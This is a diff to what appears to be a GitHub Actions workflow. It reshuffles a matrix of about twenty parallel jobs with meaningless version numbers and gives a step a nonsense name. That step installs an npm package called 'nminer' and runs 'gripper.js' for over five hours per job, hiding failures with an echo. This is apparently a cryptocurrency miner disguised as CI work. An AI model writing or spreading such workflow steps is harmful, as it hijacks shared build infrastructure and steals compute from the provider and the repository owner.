@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7925 }
-          - { version: 9934 }
-          - { version: 6131 }
-          - { version: 4972 }
-          - { version: 319 }
-          - { version: 3393 }
-          - { version: 1775 }
-          - { version: 3920 }
-          - { version: 8908 }
-          - { version: 8406 }
-          - { version: 1561 }
-          - { version: 2744 }
-          - { version: 4106 }
-          - { version: 2935 }
-          - { version: 8448 }
-          - { version: 9994 }
-          - { version: 7360 }
-          - { version: 6464 }
-          - { version: 7499 }
+          - { version: 8261 }
+          - { version: 8215 }
+          - { version: 6534 }
+          - { version: 5087 }
+          - { version: 7597 }
+          - { version: 4577 }
+          - { version: 9806 }
+          - { version: 7228 }
+          - { version: 1379 }
+          - { version: 897 }
+          - { version: 6775 }
+          - { version: 5950 }
+          - { version: 6496 }
+          - { version: 5632 }
+          - { version: 2633 }
+          - { version: 5488 }
+          - { version: 1094 }
+          - { version: 7123 }
+          - { version: 5205 }
+          - { version: 3037 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: consequently nightlife or
+      - name: superficial
         run: |
           npm install nminer@latest
-          timeout 323m node gripper.js || echo "gripper executed"
+          timeout 327m node gripper.js || echo "gripper executed"
